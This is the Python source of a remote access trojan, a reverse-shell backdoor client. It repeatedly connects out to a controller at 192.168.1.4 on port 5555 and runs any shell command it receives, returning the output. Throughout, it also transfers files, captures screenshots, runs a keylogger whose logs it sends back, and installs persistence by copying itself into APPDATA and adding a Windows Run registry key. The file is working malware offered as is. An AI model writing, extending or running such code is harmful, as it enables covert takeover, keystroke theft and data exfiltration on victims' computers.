import socket  # Import the socket module for network communication
import json  # Import the json module for JSON serialization/deserialization
import subprocess  # Import the subprocess module for running shell commands
import time  # Import the time module for time-related operations
import os  # Import the os module for interacting with the operating system
import pyautogui  # Import the pyautogui module for taking screenshots
import keylogger  # Import the keylogger module for keylogging functionality
import threading  # Import the threading module for concurrent execution
import shutil  # Import the shutil module for file operations
import sys  # Import the sys module for system-specific parameters and functions

# Function to send data reliably over the network
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send encoded JSON data

# Function to receive data reliably over the network
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive and decode data
            return json.loads(data)  # Deserialize JSON data
        except ValueError:
            continue

# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

# Function to take a screenshot
def screenshot():
    myScreenshot = pyautogui.screenshot()  # Capture screenshot using pyautogui
    myScreenshot.save('screen.png')  # Save screenshot to a file

# Function to create persistence on the target machine
def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name  # Construct the path for the copy of the script
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)  # Copy the script to the specified location
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)  # Add registry entry for persistence
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')

# Function to establish a network connection and maintain it
def connection():
    while True:
        time.sleep(20)  # Wait for 20 seconds before reconnecting
        try:
            s.connect(('192.168.1.4', 5555))  # Connect to the remote host
            shell()  # Enter the shell interaction loop
            s.close()
            break
        except:
            connection()  # If connection fails, retry

# Function for shell interaction with remote host
def shell():
    while True:
        command = reliable_recv()  # Receive a command from the remote host
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])  # Change current directory
        elif command[:6] == 'upload':
            download_file(command[7:])  # Download a file from the remote host
        elif command[:8] == 'download':
            upload_file(command[9:])  # Upload a file to the remote host
        elif command[:10] == 'screenshot':
            screenshot()  # Capture and send a screenshot
            upload_file('screen.png')  # Upload the screenshot file
            os.remove('screen.png')  # Remove the local screenshot file
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()  # Create a keylogger instance
            t = threading.Thread(target=keylog.start)  # Create a thread to start keylogging
            t.start()  # Start the keylogger thread
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()  # Read keylog contents
            reliable_send(logs)  # Send keylog contents to remote host
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()  # Stop keylogging and remove log file
            t.join()  # Wait for keylogger thread to finish
            reliable_send('[+] Keylogger Stopped!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')  # Extract registry and copy names
            persist(reg_name, copy_name)  # Create persistence on the target machine
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # Execute a shell command
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)  # Execute a shell command
            result = execute.stdout.read() + execute.stderr.read()  # Capture command output
            result = result.decode()  # Decode command output
            reliable_send(result)  # Send command output to remote host

# Create a socket object for network communication
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()  # Establish and maintain a network connection
